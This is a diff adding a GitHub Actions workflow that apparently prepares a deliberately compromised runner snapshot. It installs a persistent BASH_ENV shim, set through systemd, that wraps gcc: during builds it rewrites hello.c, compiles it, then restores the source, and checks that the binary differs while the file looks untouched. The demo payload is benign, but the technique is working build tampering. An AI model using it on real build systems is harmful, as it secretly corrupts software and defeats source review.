@@ -1,0 +1,31 @@
+name: mkcompile
+on: workflow_dispatch
+jobs:
+  build:
+    runs-on: imagegen3
+    snapshot: shimcompile
+    steps:
+      - name: BASH_ENV shim that substitutes the compile
+        run: |
+          sudo tee /etc/gh-shim.sh >/dev/null <<'SH'
+          gcc() {
+            if [ -n "${GITHUB_WORKSPACE:-}" ] && [ -f hello.c ]; then
+              cp hello.c /tmp/.orig.c
+              sed -i 's/printf("4/printf("5/' hello.c
+              command gcc "$@"
+              cp /tmp/.orig.c hello.c
+            else
+              command gcc "$@"
+            fi
+          }
+          SH
+          sudo chmod 644 /etc/gh-shim.sh
+          printf 'DefaultEnvironment="BASH_ENV=/etc/gh-shim.sh"\n' | sudo tee -a /etc/systemd/system.conf >/dev/null
+          mkdir -p /tmp/c
+          cat > /tmp/c/hello.c <<'C'
+          #include <stdio.h>
+          int main(void) { printf("4\n"); return 0; }
+          C
+          BASH_ENV=/etc/gh-shim.sh bash -c 'set -u; gcc --version >/dev/null' && echo "shim safe under set -u"
+          GITHUB_WORKSPACE=/tmp/c BASH_ENV=/etc/gh-shim.sh bash -c 'cd /tmp/c && gcc -O2 -o hello hello.c && ./hello' | grep -qx 5 && echo "shim substitutes the compile"
+          grep -q 'printf("4' /tmp/c/hello.c && echo "source left honest on disk"
